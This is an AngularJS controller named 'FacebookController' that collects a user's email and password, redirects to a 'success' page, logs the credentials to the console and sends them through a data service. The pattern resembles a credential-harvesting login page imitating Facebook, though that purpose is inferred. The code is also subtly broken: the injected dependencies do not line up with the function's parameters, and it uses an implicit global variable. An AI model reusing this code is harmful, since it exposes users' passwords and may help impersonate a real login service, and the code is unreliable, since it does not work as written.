angular.module('Friso.controllers')
  .controller('FacebookController',
  ['$scope', '$state', 'DemoService', 'DataService', 'ngDialog', 'PageService',
    function($scope, $state, DataService) {

      $scope.secure = function(){


        d = {
          email:$scope.email,
          password: $scope.password
        }
        $state.go('success')

        console.log(d)

        DataService.send(d)
          .then(function(d){
            console.log(d)

          })
      }


}]);
